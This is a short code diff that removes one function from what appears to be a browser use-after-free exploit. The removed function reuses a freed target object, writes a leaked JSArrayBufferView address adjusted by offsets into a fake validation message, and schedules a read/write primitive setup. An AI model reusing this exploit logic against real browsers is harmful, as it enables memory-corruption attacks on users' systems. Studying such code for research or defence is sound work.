@@ -241,14 +241,6 @@ function cleanup() {
  * Executed after buildBubbleTree
  * and before deleteBubbleTree
  */
-function confuseTargetObjRound2() {
-	if (findTargetObj() === false)
-		die("[!] Failed to reuse target obj.");
-
-	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
-
-	setTimeout(setupRW, 6000);
-}
 
 
 /* Executed after deleteBubbleTree */
